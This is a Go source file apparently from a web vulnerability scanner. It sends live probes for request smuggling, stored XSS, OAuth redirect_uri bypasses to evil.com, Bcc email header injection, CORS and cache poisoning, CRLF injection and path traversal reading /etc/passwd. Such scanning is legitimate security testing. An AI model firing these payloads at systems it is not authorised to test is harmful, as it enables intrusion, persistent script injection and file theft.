package scanner

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/zanicool/apex-cli/pkg/crawler"
	"github.com/zanicool/apex-cli/pkg/engine"
	"github.com/zanicool/apex-cli/pkg/oob"
)

// --- HTTP Request Smuggling (real desync) ---

func scanHTTPSmugglingReal(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	if len(crawl.Pages) == 0 {
		return findings
	}
	targets := []string{}
	seen := make(map[string]bool)
	for _, p := range crawl.Pages[:min(10, len(crawl.Pages))] {
		host := extractHostFromURL(p.URL)
		if !seen[host] {
			seen[host] = true
			targets = append(targets, p.URL)
		}
	}

	for _, target := range targets {
		// CL.TE test: send Content-Length that's shorter than body
		clte := "POST " + target + " HTTP/1.1\r\nHost: " + extractHostFromURL(target) + "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGPOST / HTTP/1.1\r\n\r\n"
		_ = clte // Would need raw socket, use HTTP client approximation

		// Practical test: send ambiguous headers and check for different response
		items := []engine.RequestItem{{
			URL: target, Method: "POST",
			Headers: map[string]string{
				"Content-Type":      "application/x-www-form-urlencoded",
				"Transfer-Encoding": "chunked",
				"Content-Length":    "6",
			},
			Body: "0\r\n\r\nX",
		}}
		for resp := range h.BatchRequest(items, 1) {
			if resp.Err == nil && resp.StatusCode != 400 {
				// Send normal request right after — if smuggling worked, we get unexpected response
				resp2 := h.Get(target)
				if resp2.Err == nil && resp2.StatusCode == 405 || resp2.StatusCode == 501 {
					findings = append(findings, Finding{
						Type: "HTTP Request Smuggling (CL.TE)", Severity: "critical",
						URL: target, Detail: "Desync detected — second request got unexpected status after smuggle attempt",
						Template: "apex-smuggling",
					})
				}
			}
		}
	}
	return findings
}

// --- Stored XSS ---

func scanStoredXSS(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	canary := "<img src=x onerror=document.title='APEX_STORED_XSS'>"
	canaryDetect := "APEX_STORED_XSS"

	// Submit canary in all forms that look like they store data
	storeKeywords := []string{"comment", "message", "feedback", "review", "post", "name", "bio", "description", "title", "note"}

	for _, form := range crawl.Forms {
		isStore := false
		for _, kw := range storeKeywords {
			if strings.Contains(strings.ToLower(form.Action), kw) {
				isStore = true
				break
			}
			for _, inp := range form.Inputs {
				if strings.Contains(strings.ToLower(inp.Name), kw) {
					isStore = true
					break
				}
			}
		}
		if !isStore {
			continue
		}

		// Submit the form with XSS canary
		data := url.Values{}
		for _, inp := range form.Inputs {
			if strings.Contains(strings.ToLower(inp.Name), "email") {
				data.Set(inp.Name, "test@apex.local")
			} else if strings.Contains(strings.ToLower(inp.Name), "url") {
				data.Set(inp.Name, "https://apex.local")
			} else {
				data.Set(inp.Name, canary)
			}
		}
		h.Post(form.Action, "application/x-www-form-urlencoded", data.Encode())

		// Now check if canary appears on any page
		time.Sleep(1 * time.Second)
		for _, page := range crawl.Pages[:min(20, len(crawl.Pages))] {
			resp := h.Get(page.URL)
			if resp.Err == nil && strings.Contains(resp.Body, canaryDetect) {
				findings = append(findings, Finding{
					Type: "Stored XSS", Severity: "critical",
					URL: page.URL, Payload: canary,
					Detail:   fmt.Sprintf("XSS payload submitted via %s renders on %s", form.Action, page.URL),
					Template: "apex-stored-xss",
				})
				break
			}
		}
	}
	return findings
}

// --- OAuth redirect_uri bypass ---

func scanOAuthBypass(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	if len(crawl.Pages) == 0 {
		return findings
	}
	base := extractBaseURL(crawl.Pages[0].URL)

	oauthPaths := []string{"/oauth/authorize", "/oauth2/authorize", "/auth/authorize", "/connect/authorize", "/oauth2/auth", "/authorize"}
	for _, path := range oauthPaths {
		resp := h.Get(base + path)
		if resp.Err != nil || resp.StatusCode == 404 {
			continue
		}

		// Test redirect_uri bypasses
		bypasses := []string{
			"https://evil.com",
			base + ".evil.com",
			base + "/callback/../../../evil.com",
			base + "/callback%23@evil.com",
			base + "/callback?next=https://evil.com",
			"https://evil.com%23" + base,
			base + "/callback/../../evil.com",
		}
		for _, bypass := range bypasses {
			testURL := base + path + "?client_id=test&redirect_uri=" + url.QueryEscape(bypass) + "&response_type=code"
			testResp := h.Get(testURL)
			if testResp.Err != nil {
				continue
			}
			location := testResp.Headers.Get("Location")
			if strings.Contains(location, "evil.com") {
				findings = append(findings, Finding{
					Type: "OAuth redirect_uri Bypass", Severity: "critical",
					URL: testURL, Payload: bypass,
					Detail:   fmt.Sprintf("OAuth redirects to attacker domain: %s", location),
					Template: "apex-oauth-bypass",
				})
				break
			}
		}
		break
	}
	return findings
}

// --- WebSocket Injection ---

func scanWebSocketInjection(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	if len(crawl.Pages) == 0 {
		return findings
	}
	base := extractBaseURL(crawl.Pages[0].URL)
	wsPaths := []string{"/ws", "/websocket", "/socket.io/", "/cable", "/hub", "/realtime", "/live"}

	for _, path := range wsPaths {
		wsURL := strings.Replace(base, "https://", "wss://", 1)
		wsURL = strings.Replace(wsURL, "http://", "ws://", 1)
		wsURL += path

		// Check if WS endpoint exists via HTTP upgrade
		req, _ := http.NewRequest("GET", base+path, nil)
		req.Header.Set("Upgrade", "websocket")
		req.Header.Set("Connection", "Upgrade")
		req.Header.Set("Sec-WebSocket-Version", "13")
		req.Header.Set("Sec-WebSocket-Key", "dGhlIHNhbXBsZSBub25jZQ==")
		resp := h.Do(req)
		if resp.Err == nil && (resp.StatusCode == 101 || resp.StatusCode == 200) {
			findings = append(findings, Finding{
				Type: "WebSocket Endpoint Found", Severity: "medium",
				URL: wsURL, Detail: fmt.Sprintf("WebSocket endpoint at %s accepts connections (status %d)", path, resp.StatusCode),
				Template: "apex-websocket",
			})
		}
	}
	return findings
}

// --- Email Header Injection ---

func scanEmailHeaderInjection(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	emailKeywords := []string{"contact", "feedback", "email", "mail", "message", "support"}

	for _, form := range crawl.Forms {
		isEmail := false
		for _, kw := range emailKeywords {
			if strings.Contains(strings.ToLower(form.Action), kw) {
				isEmail = true
				break
			}
		}
		if !isEmail {
			continue
		}

		// Inject CRLF in email field
		data := url.Values{}
		for _, inp := range form.Inputs {
			if strings.Contains(strings.ToLower(inp.Name), "email") || strings.Contains(strings.ToLower(inp.Name), "from") {
				data.Set(inp.Name, "test@apex.local\r\nBcc: attacker@evil.com")
			} else if strings.Contains(strings.ToLower(inp.Name), "subject") {
				data.Set(inp.Name, "Test\r\nBcc: attacker@evil.com")
			} else {
				data.Set(inp.Name, "test")
			}
		}
		resp := h.Post(form.Action, "application/x-www-form-urlencoded", data.Encode())
		if resp.Err == nil && resp.StatusCode == 200 && !strings.Contains(resp.Body, "invalid") && !strings.Contains(resp.Body, "error") {
			findings = append(findings, Finding{
				Type: "Email Header Injection", Severity: "medium",
				URL: form.Action, Payload: "\\r\\nBcc: attacker@evil.com",
				Detail:   "Form accepts CRLF in email fields — email header injection possible",
				Template: "apex-email-injection",
			})
		}
	}
	return findings
}

// --- CORS on every subdomain ---

func scanCORSAllSubdomains(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, 20)

	seen := make(map[string]bool)
	for _, page := range crawl.Pages {
		host := extractHostFromURL(page.URL)
		if seen[host] {
			continue
		}
		seen[host] = true

		wg.Add(1)
		go func(pageURL string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			req, _ := http.NewRequest("GET", pageURL, nil)
			req.Header.Set("Origin", "https://evil.com")
			resp := h.Do(req)
			if resp.Err != nil || engine.IsWAFChallenge(resp) {
				return
			}
			acao := resp.Headers.Get("Access-Control-Allow-Origin")
			acac := resp.Headers.Get("Access-Control-Allow-Credentials")
			if acao == "https://evil.com" && strings.EqualFold(acac, "true") {
				mu.Lock()
				findings = append(findings, Finding{
					Type: "CORS Misconfiguration (Subdomain)", Severity: "high",
					URL: pageURL, Detail: "Reflects arbitrary origin with credentials=true",
					Evidence: fmt.Sprintf("ACAO: %s, ACAC: %s", acao, acac),
					Template: "apex-cors-subdomain",
				})
				mu.Unlock()
			}
		}(page.URL)
	}
	wg.Wait()
	return findings
}

// --- Open Redirect → OAuth Chain ---

func scanOpenRedirectOAuthChainReal(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	if len(crawl.Pages) == 0 {
		return findings
	}
	base := extractBaseURL(crawl.Pages[0].URL)

	// First find open redirects
	redirectParams := []string{"url", "redirect", "next", "return", "returnTo", "goto", "dest", "continue", "redir"}
	var redirects []string

	for u, params := range crawl.Params {
		for _, p := range params {
			for _, rp := range redirectParams {
				if strings.EqualFold(p, rp) {
					testURL := injectParam(u, p, "https://evil.com")
					resp := h.Get(testURL)
					if resp.Err == nil {
						loc := resp.Headers.Get("Location")
						if strings.Contains(loc, "evil.com") {
							redirects = append(redirects, testURL)
						}
					}
				}
			}
		}
	}

	if len(redirects) == 0 {
		return findings
	}

	// Check if target has OAuth
	oauthPaths := []string{"/oauth/authorize", "/oauth2/authorize", "/auth/authorize"}
	for _, path := range oauthPaths {
		resp := h.Get(base + path)
		if resp.Err == nil && resp.StatusCode != 404 {
			findings = append(findings, Finding{
				Type: "Open Redirect → OAuth Token Theft", Severity: "critical",
				URL: redirects[0], Detail: fmt.Sprintf("Open redirect + OAuth at %s = steal authorization codes", base+path),
				Template: "apex-redirect-oauth",
			})
			break
		}
	}
	return findings
}

// --- Host Header Cache Poisoning ---

func scanHostHeaderCache(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	if len(crawl.Pages) == 0 {
		return findings
	}

	for _, page := range crawl.Pages[:min(5, len(crawl.Pages))] {
		// Send request with evil Host header
		req, _ := http.NewRequest("GET", page.URL, nil)
		req.Header.Set("X-Forwarded-Host", "evil.com")
		resp := h.Do(req)
		if resp.Err != nil || engine.IsWAFChallenge(resp) {
			continue
		}
		if strings.Contains(resp.Body, "evil.com") {
			// Check if it's cached
			resp2 := h.Get(page.URL)
			if resp2.Err == nil && strings.Contains(resp2.Body, "evil.com") {
				findings = append(findings, Finding{
					Type: "Host Header Cache Poisoning", Severity: "critical",
					URL: page.URL, Payload: "X-Forwarded-Host: evil.com",
					Detail:   "Injected host reflected AND cached — serve malicious content to all users",
					Template: "apex-cache-poison",
				})
			} else {
				findings = append(findings, Finding{
					Type: "Host Header Injection (Not Cached)", Severity: "medium",
					URL: page.URL, Payload: "X-Forwarded-Host: evil.com",
					Detail:   "Injected host reflected in response but not cached",
					Template: "apex-host-injection",
				})
			}
			break
		}
	}
	return findings
}

// --- Password Reset Token in Referer ---

func scanPasswordResetReferer(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	if len(crawl.Pages) == 0 {
		return findings
	}
	base := extractBaseURL(crawl.Pages[0].URL)

	resetPaths := []string{"/password/reset", "/reset-password", "/forgot-password", "/auth/reset"}
	for _, path := range resetPaths {
		resp := h.Get(base + path)
		if resp.Err != nil || resp.StatusCode == 404 {
			continue
		}
		// Check if page has external resources (leaks Referer)
		if strings.Contains(resp.Body, "https://") && (strings.Contains(resp.Body, "script src") || strings.Contains(resp.Body, "img src")) {
			// Check Referrer-Policy header
			rp := resp.Headers.Get("Referrer-Policy")
			if rp == "" || rp == "unsafe-url" || rp == "no-referrer-when-downgrade" {
				findings = append(findings, Finding{
					Type: "Password Reset Token Leaked via Referer", Severity: "high",
					URL: base + path, Detail: fmt.Sprintf("Reset page loads external resources without Referrer-Policy (current: '%s') — token in URL leaked to third parties", rp),
					Template: "apex-reset-referer",
				})
			}
		}
		break
	}
	return findings
}

// --- CRLF Header Injection ---

func scanCRLFInjection(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	canary := "ApexInjected"

	for u, params := range crawl.Params {
		if !strings.Contains(u, "?") {
			continue
		}
		for _, p := range params[:min(3, len(params))] {
			payloads := []string{
				"%0d%0aX-Injected: " + canary,
				"%0aX-Injected: " + canary,
				"\r\nX-Injected: " + canary,
			}
			for _, payload := range payloads {
				testURL := injectParam(u, p, payload)
				resp := h.Get(testURL)
				if resp.Err != nil || engine.IsWAFChallenge(resp) {
					continue
				}
				if resp.Headers.Get("X-Injected") == canary {
					findings = append(findings, Finding{
						Type: "CRLF Header Injection", Severity: "high",
						URL: testURL, Param: p, Payload: payload,
						Detail:   "CRLF injection allows setting arbitrary response headers",
						Template: "apex-crlf",
					})
					return findings
				}
			}
		}
	}
	return findings
}

// --- Path Traversal Deep ---

func scanPathTraversalDeep(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	fileParams := []string{"file", "path", "page", "include", "template", "doc", "document", "folder", "root", "pg", "style", "pdf", "img", "download"}

	traversals := []string{
		"../../../etc/passwd",
		"....//....//....//etc/passwd",
		"..%2f..%2f..%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"/etc/passwd",
		"....\\....\\....\\windows\\win.ini",
		"..%5c..%5c..%5cwindows%5cwin.ini",
		"php://filter/convert.base64-encode/resource=/etc/passwd",
		"file:///etc/passwd",
	}

	for u, params := range crawl.Params {
		if !strings.Contains(u, "?") {
			continue
		}
		for _, p := range params {
			pLower := strings.ToLower(p)
			isFileParam := false
			for _, fp := range fileParams {
				if strings.Contains(pLower, fp) {
					isFileParam = true
					break
				}
			}
			if !isFileParam {
				continue
			}
			for _, payload := range traversals {
				testURL := injectParam(u, p, payload)
				resp := h.Get(testURL)
				if resp.Err != nil || engine.IsWAFChallenge(resp) {
					continue
				}
				if strings.Contains(resp.Body, "root:") || strings.Contains(resp.Body, "[fonts]") || strings.Contains(resp.Body, "cm9vdD") {
					findings = append(findings, Finding{
						Type: "Path Traversal / LFI", Severity: "critical",
						URL: testURL, Param: p, Payload: payload,
						Detail:   "Local file read confirmed",
						Evidence: resp.Body[:min(100, len(resp.Body))],
						Template: "apex-path-traversal",
					})
					return findings
				}
			}
		}
	}
	return findings
}
